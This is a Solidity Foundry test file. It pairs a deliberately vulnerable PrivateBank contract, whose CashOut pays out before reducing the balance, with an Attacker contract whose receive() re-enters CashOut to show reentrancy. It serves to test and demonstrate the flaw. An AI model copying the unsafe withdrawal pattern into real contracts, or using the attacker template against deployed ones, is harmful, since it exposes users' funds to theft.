
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";

contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}

contract PrivateBank
{
    mapping (address => uint) public balances;
    
    uint public MinDeposit = 1 ether;
    
    Log TransferLog;
    
    constructor(address _log) {
        TransferLog = Log(_log);
    }
    
    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }
    
    function CashOut(uint _am)
    public
    {
        if(_am<=balances[msg.sender])
        {            
            (bool success, ) = msg.sender.call{value: _am}("");
            if(success)
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }
    
    receive() external payable {}
}

contract TestReentrancyPrivateBank is Test {
    
    PrivateBank public _contractUnderTest;
    Log public _log;
    
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new PrivateBank(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether.
        vm.assume(attackVal >= 1 ether && attackVal < 100 ether);

        // --- 3. Funding ---
        // Fund the Victim (so it has ETH to steal/withdraw)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract (address(this)) to send to Attacker
        vm.deal(address(this), attackVal * 10);

        // --- 4. Trigger Attack ---
        // We deposit 2 * attackVal. This allows us to withdraw 'attackVal' twice (once normally, once via reentrancy).
        // This proves the reentrancy vulnerability (stale state check) without causing an underflow revert 
        // in Solidity 0.8.x (which would happen if we tried to withdraw more than deposited).
        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PrivateBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit 2x the attack value to ensure we have enough balance 
        // to cover both the initial and re-entrant withdrawal without underflow.
        _victim.Deposit{value: val * 2}();
    }

    function attack(uint256 val) public {
        storedAttackVal = val;

        // Call the vulnerable function.
        _victim.CashOut(val);

        // Verify Success Conditions.
        // If we successfully re-entered, attackCallCount will be 2 (1 initial + 1 re-entry).
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        // Limit re-entrancy to 1 extra call to demonstrate the vulnerability
        if (attackCallCount < 2) {            
            _victim.CashOut(storedAttackVal);
        }
    }
}
